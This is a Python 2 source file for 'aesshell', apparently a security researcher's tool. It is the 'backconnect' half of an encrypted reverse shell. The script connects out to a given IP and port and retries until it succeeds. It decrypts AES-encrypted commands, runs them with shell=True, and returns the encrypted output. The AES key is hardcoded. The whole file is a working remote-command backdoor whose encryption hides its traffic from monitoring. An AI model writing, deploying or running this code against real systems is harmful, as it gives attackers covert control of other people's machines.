#!/usr/bin/env python2
#
#

import os
import sys
import time
import socket
import select
import subprocess

import aes

# removed due pyinstaller problems
# import fcrypto as fc

version = "0.3"

def usage():
	print "aesshell v%s - using AES-CBC + HMAC-SHA256" % version
	print "backconnect part, use it on the system you need the shell"
	print "spring 2015 by Marco Lux <ping@curesec.com>"
	print
	print "%s <ip> <port>" % (sys.argv[0])
	print

def buildSocket(rip,rport):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((rip,rport))
	except socket.error, e:
		print e[1]
		return -1
	return s

def socketLoop(rip,rport):
	i = 0
	while True:
		s = buildSocket(rip,rport)
		if s == -1:
			print "Retry..."
			time.sleep(5)
			i+=1
		elif s == -1 and i == 10:
			print "I give up."
			sys.exit(1)
		else:
			return s

def shellWindows(decStdin):

	# send command, this is not a real shell for instance chdir won't work
	# but better as no code exec on windows :)
	proc = subprocess.Popen(decStdin, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

	# collect the output data from the stdout/stderr fd
	pStdout = proc.stdout.read() + proc.stderr.read()

	#debug print
#	print pStdout

	return pStdout



def main(rip,rport,key):
	inputs = []

	#initialize fernet and get back our crypto handle
	#f = fc.initFernet()

	# initialize aes class
	ac = aes.Crypticle(key)

	# first of all try to connect, give up after 10 tries
	s = socketLoop(rip,rport)
			
	# add the server to our inputs
	inputs.append(s)

	# save the socket information in the server variable
	bc = s
	cbuffer = ""

	while True:

		try:
			inputs , outputs , errors = select.select(inputs,[],[])
		except select.error, e:
			print e
			break
		except socket.error, e:
			print e
			break

		for s in inputs:
			if s == bc:

				try:
					data = s.recv(1)
				except socket.error, e:
					print "Error: ", e
					sys.exit(1)
					
				if data == '':
					print "Disconnected"
					s.close()
					sys.exit()

				cbuffer += data
			else:
				print "Do we ever get here?"

		#decrypt data
		decStdin = ac.loads(cbuffer)

		if decStdin != -1:
			cbuffer = ""

			# call shell command
			pStdout = shellWindows(decStdin)

			#encrypt the data
			encStdout = ac.dumps(pStdout)

			# send data to listener
			s.send(encStdout)

	s.close()
	print "[*] Finished"

if __name__ == "__main__":

	if len(sys.argv)<3:
		usage()
		sys.exit(1)

	rip = sys.argv[1]
	rport = int(sys.argv[2])
	key = "F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4="
	main(rip,rport,key)
